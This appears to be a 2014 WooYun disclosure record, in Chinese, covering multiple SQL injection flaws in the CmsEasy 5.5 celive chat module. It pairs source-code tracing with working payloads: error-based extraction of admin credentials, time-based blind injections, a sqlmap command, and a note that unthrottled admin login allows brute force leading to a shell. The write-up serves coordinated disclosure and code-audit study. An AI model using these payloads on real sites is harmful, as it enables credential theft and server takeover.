{"id": 306, "wybug_id": "wooyun-2014-070827", "wybug_title": "CmsEasy最新版5.5_UTF-8_20140802多处SQL注入", "wybug_corp": "cmseasy", "wybug_author": "xfkxfk", "wybug_date": "2014-08-03 12:16", "wybug_open_date": "2014-11-01 12:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "字符类型注射", "源码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向公众公开  简要描述： CmsEasy官方8.2号，更新了CmsEasy_5.5_UTF-8_20140802.rar并且发布了补丁CmsEasy_for_Uploads_20140802.rar然后，下载了个最新的包，看了下，发现一处问题这个问题引发多处SQL注入。另附：还有一个问题就是可以进行暴力注入，然后进后台拿shell。 详细说明：  CmsEasy有一个客服聊天模块celive这里/celive/live/目录下的四个文件header.php，index.php，mainbox.php，send.php都存在同样的问题，这里拿header.php举例。文件/celive/live/header.php\n<?phpinclude('../include/config.inc.php');include(CE_ROOT.'/include/celive.class.php');$header = new celive();$header->template();$header->xajax_live();$GLOBALS['template']->assign('ifexit','<script type=\"text/javascript\">\t\t\t\t\t\t\t function chat_unload()\t\t\t\t\t\t\t {\t\t\t\t\t\t\t\t if(event.clientX>document.body.clientWidth&&event.clientY<0||event.altKey) \t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t xajax_EndChat();\t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t }\t\t\t\t\t\t\t\t </script>');$GLOBALS['template']->assign('xajax_live',$xajax_live->getJavascript(''));$GLOBALS['template']->assign('operatorname',$_SESSION['operatorname']);$GLOBALS['template']->assign('dname',$_SESSION['dname']);$GLOBALS['template']->display('header.htm');?>\n这里调用了xajax_live函数文件/celive/include/celive.class.php\nfunction xajax_live() {        if (!$this->xajax_live_flag) {            $this->xajax_live_flag=true;            include_once(dirname(__FILE__).'/xajax.inc.php');            include_once(dirname(__FILE__).'/xajax.class.php');            global $xajax_live;            $xajax_live=new xajax();            $xajax_live->setCharEncoding('utf-8');            $xajax_live->decodeUTF8InputOn();            $xajax_live->registerFunction('Request');            $xajax_live->registerFunction('Postdata');            $xajax_live->registerFunction('ChatHistory');            $xajax_live->registerFunction('LiveMessage');            $xajax_live->registerFunction('EndChat');            $xajax_live->registerFunction('GetAdminEndChat');            $xajax_live->processRequests();        }    }\n这里调用了registerFunction函数跟进：文件：/celive/include/xajax.class.php\nfunction registerFunction($mFunction,$sRequestType=XAJAX_POST){if (is_string($sRequestType)) {return $this->registerExternalFunction($mFunction,$sRequestType);}if (is_array($mFunction)) {$this->aFunctions[$mFunction[0]] = 1;$this->aFunctionRequestTypes[$mFunction[0]] = $sRequestType;$this->aObjects[$mFunction[0]] = array_slice($mFunction,1);}else {$this->aFunctions[$mFunction] = 1;$this->aFunctionRequestTypes[$mFunction] = $sRequestType;}}function registerExternalFunction($mFunction,$sIncludeFile,$sRequestType=XAJAX_POST){$this->registerFunction($mFunction,$sRequestType);if (is_array($mFunction)) {$this->aFunctionIncludeFiles[$mFunction[0]] = $sIncludeFile;}else {$this->aFunctionIncludeFiles[$mFunction] = $sIncludeFile;}}\n这里用来注册函数，然后进行一些变量赋值最后调用了processRequests函数，主要来分析一下这个函数还是在文件/celive/include/xajax.class.php：\nfunction processRequests(){//初始化一堆变量$requestMode = -1;$sFunctionName = \"\";$bFoundFunction = true;$bFunctionIsCatchAll = false;$sFunctionNameForSpecial = \"\";$aArgs = array();$sPreResponse = \"\";$bEndRequest = false;$requestMode = $this->getRequestMode();if ($requestMode == -1) return;//这两使用POST传入两个参数，一个xajax，代表函数名，一个xajaxargs，代表要传给xajax所代表的函数的参数，这个参数必须是一个数组，下面作分析if ($requestMode == XAJAX_POST){$sFunctionName = $_POST[\"xajax\"];if (!empty($_POST[\"xajaxargs\"])) $aArgs = $_POST[\"xajaxargs\"];}else{header (\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\");header (\"Last-Modified: \".gmdate(\"D, d M Y H:i:s\") .\" GMT\");header (\"Cache-Control: no-cache, must-revalidate\");header (\"Pragma: no-cache\");$sFunctionName = $_GET[\"xajax\"];if (!empty($_GET[\"xajaxargs\"])) $aArgs = $_GET[\"xajaxargs\"];}if ($this->bErrorHandler) {$GLOBALS['xajaxErrorHandlerText'] = \"\";set_error_handler(\"xajaxErrorHandler\");}//这里的if没有进入不用管if ($this->sPreFunction) {if (!$this->_isFunctionCallable($this->sPreFunction)) {$bFoundFunction = false;$oResponse = new xajaxResponse();$oResponse->addAlert(\"Unknown Pre-Function \".$this->sPreFunction);}}//这里的if也没有进入，不用管if (array_key_exists($sFunctionName,$this->aFunctionIncludeFiles)){ob_start();echo $this->aFunctionIncludeFiles[$sFunctionName];//no inputinclude_once($this->aFunctionIncludeFiles[$sFunctionName]);ob_end_clean();}//这里开始判断POST提交进来的xajax代表的函数是否在$this->aFunctions代表的上面所注册的函数中，如果不在则退出//$sFunctionName为POST进来的函数名,$this->aFunctions为之前注册的6个函数if ($bFoundFunction) {$sFunctionNameForSpecial = $sFunctionName;if (!array_key_exists($sFunctionName,$this->aFunctions)){//print_r($this->aFunctions);//registered functionif ($this->sCatchAllFunction) {$sFunctionName = $this->sCatchAllFunction;$bFunctionIsCatchAll = true;}else {$bFoundFunction = false;$oResponse = new xajaxResponse();$oResponse->addAlert(\"Unknown Function $sFunctionName.\");}}}//下面继续判断if ($bFoundFunction){//这里判断POST进来的函数的参数值aArgs中的内容for ($i = 0;$i <sizeof($aArgs);$i++){if (get_magic_quotes_gpc() == 1 &&is_string($aArgs[$i])) {$aArgs[$i] = stripslashes($aArgs[$i]);}if (stristr($aArgs[$i],\"<xjxobj>\") != false){$aArgs[$i] = $this->_xmlToArray(\"xjxobj\",$aArgs[$i]);}else if (stristr($aArgs[$i],\"<xjxquery>\") != false){$aArgs[$i] = $this->_xmlToArray(\"xjxquery\",$aArgs[$i]);}else if ($this->bDecodeUTF8Input){$aArgs[$i] = $this->_decodeUTF8Data($aArgs[$i]);}}//这里的if未进入，不用管if ($this->sPreFunction) {$mPreResponse = $this->_callFunction($this->sPreFunction,array($sFunctionNameForSpecial,$aArgs));if (is_array($mPreResponse) &&$mPreResponse[0] === false) {$bEndRequest = true;$sPreResponse = $mPreResponse[1];}else {$sPreResponse = $mPreResponse;}if ($bEndRequest) $oResponse = $sPreResponse;}//这里继续判断if (!$bEndRequest) {if (!$this->_isFunctionCallable($sFunctionName)) {$oResponse = new xajaxResponse();//no inout$oResponse->addAlert(\"The Registered Function $sFunctionName Could Not Be Found.\");}//进入这里的else条件else {if ($bFunctionIsCatchAll) {$aArgs = array($sFunctionNameForSpecial,$aArgs);}//这里真正的调用了POST进来的函数$oResponse = $this->_callFunction($sFunctionName,$aArgs);//POST的内容进入这里}//下面的就不用管了if (@is_string($sResponse)) {$oResponse = new xajaxResponse();$oResponse->addAlert(\"No XML Response Was Returned By Function $sFunctionName.\\n\\nOutput: \".$oResponse);}else if ($sPreResponse != \"\") {$oNewResponse = new xajaxResponse($this->sEncoding,$this->bOutputEntities);$oNewResponse->loadXML($sPreResponse);$oNewResponse->loadXML($oResponse);$oResponse = $sNewResponse;}}}\n从上面的分析得知，我们POST的内容已经进入了_callFunction函数还是同一文件，来看看：\nfunction _callFunction($sFunction,$aArgs){if ($this->_isObjectCallback($sFunction)) {$mReturn = call_user_func_array($this->aObjects[$sFunction],$aArgs);}else {//进入else逻辑//这里调用了POST传入的函数名，然后把POST的参数值传入该函数做参数，这里call_user_func_array的第二个参数的值必须为一个数组，这正是前面说的POST的内容到目前为止是一个数组$mReturn = call_user_func_array($sFunction,$aArgs);}return $mReturn;}\n然后我们继续往下现在来看看这里注册的函数：\nRequestPostdataChatHistoryLiveMessageEndChatGetAdminEndChat\n这里的6个函数使用了我们POST的内容的只有LiveMessage和GetAdminEndChat来看看LiveMessage，文件/celive/include/xajax.inc.php：\nfunction LiveMessage($a) {    global $db;    $sessionid = $_SESSION['sessionid'];    $name = htmlspecialchars($a['name']);    $email = htmlspecialchars($a['email']);    $country = htmlspecialchars($a['country']);    $phone = htmlspecialchars($a['phone']);    $departmentid = htmlspecialchars($a['departmentid']);    $message = htmlspecialchars($a['message']);    $timestamp = time();    $ip = $_SERVER['REMOTE_ADDR'];    $sql = \"INSERT INTO `chat` (`sessionid`,`name`,`email`,`phone`,`departmentid`,`message`,`timestamp`,`ip`,`status`) VALUES('\" . $sessionid . \"','\" . $name . \"','\" . $email . \"','\" . $phone . \"','\" . $departmentid . \"','\" . $message . \"','\" . $timestamp . \"','\" . $ip . \"','2')\";    $db->query($sql);    $sql = \"DELETE FROM `sessions` WHERE `id`='\" . $sessionid . \"'\";    $db->query($sql);    $text = \"<?php echo $lang[shout_success]?>\\n\";    $objResponse = new xajaxResponse('utf-8');    $objResponse->addAssign('content', 'innerHTML', $text);    $objResponse->redirect('../', 5);    return $objResponse;}\n这里的$a就是我们POST进来的$aArgs，这里取得是$a的元素进入了SQL如这里的$a['email']，$a['email']等，所以我们在POST $aArgs时，必须是一个二维数组了。再看看GetAdminEndChat函数：\nfunction GetAdminEndChat($chatid) {    global $db;    $objResponse = new xajaxResponse('utf-8');    $sql = \"SELECT `status` FROM `chat` WHERE `id`='\" . $chatid . \"'\";    @$result = $db->query($sql);    if ($result[0]['status'] == 0) {        $objResponse->script(\"alert('<?php echo $lang[connection]?>');window.parent.close();\");    }    return $objResponse;}\n这里$chatid进入了SQL，是一个一维数组通过上面的分析得知，我们POST的内容进入了函数，进入了SQL而且这个过程是没有过滤的，因为在celive模块，是一个独立的模块没有使用全局的过滤，文件/celive/live/header.php中也没有引用全局过滤最后进去SQL后，也是用celive自有的db模块，也没有过滤，最后导致SQL注入最后在文件/celive/include/xajax.inc.php中的函数很多都存在注入一部分是上面分析的6个，无需登录即可访问调用的函数一部分是登陆后才能访问调用的函数，这些同样存在SQL注入问题，这里通过/celive/admin/live/header.php来进行调用：\ninclude('../../include/config.inc.php');include(CE_ROOT.'/include/admin/check.inc.php');include(CE_ROOT.'/include/celive.class.php');$admin_header = new celive();$admin_header->template();$admin_header->admin_xajax_live();\nadmin_xajax_live函数也是进行注册函数，然后通过POST传入参数，调用函数。   漏洞证明：  第一处SQL注入：\n链接：http://localhost/CmsEasy_5.5_UTF-8_20140718/celive/live/header.phpPOST：xajax=LiveMessage&xajaxargs[0][name]=1',(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(username,0x23,password) from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),'','','','1','127.0.0.1','2')#\n如图证明：\n\n第二处SQL注入：\n链接：http://localhost/CmsEasy_5.5_UTF-8_20140718/celive/live/header.phpPOST：xajax=GetAdminEndChat&xajaxargs[1]=1' and if(mid(user(),1,1)='r',sleep(10),1)#\n这里会延迟10秒返回因为无视任何防御，这里的user()，可以换位任何sql语句，通过盲注来注入数据利用脚本还是很快的，或者使用SQLmap证明：\npython sqlmap.py -u \"http://localhost/CmsEasy_5.5_UTF-8_20140718/celive/live/index.php?action=1\" --data \"xajax=GetAdminEndChat&xajaxargs[1]=1\" -p \"xajaxargs[1]\" --dbms \"mysql\"\n如图证明：\n\n第三处SQL注入：此处需要登录\n链接：http://localhost/CmsEasy_5.5_UTF-8_20140718/celive/admin/live/header.phpPOST：xajax=EndChats&xajaxargs[1]=1' and if(mid(user(),1,1)='r',sleep(10),1)#\n第四处SQL注入：此处需要登录\n链接：http://localhost/CmsEasy_5.5_UTF-8_20140718/celive/admin/live/header.phpPOST：xajax=AdminChatHistory&xajaxargs[1]=1' and if(mid(user(),1,1)='r',sleep(10),1)#\n等等第五处暴力注入：\n链接：http://localhost/CmsEasy_5.5_UTF-8_20140802/celive/admin/login.phpPOST：submit=%E6%8F%90%E4%BA%A4&username=123&password=123&submit=+%E7%99%BB+%E9%99%86+\n\n\n这里登陆时，没有验证码，没有次数限制等任何防暴力注入处理。导致可以暴力注入，而且这里的用户必须是管理员。所以可以进一步暴力注入后，进入后台，编辑模板处拿shell。   修复方案：  在xajaxargs，及这里传入的值进行过滤即可或者调用全局的过滤即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-03 15:17 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-03 14:47 |    \t\tMoo \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | PS：不打脸，还要泡妞呢)\t\t \n  审核找哪位。我晕    \n     2014-11-01 21:35 |    \t\t1angxi \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 研究僧，安全新手，我只是来打酱油的...)\t\t \n  代码审计哪家强    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}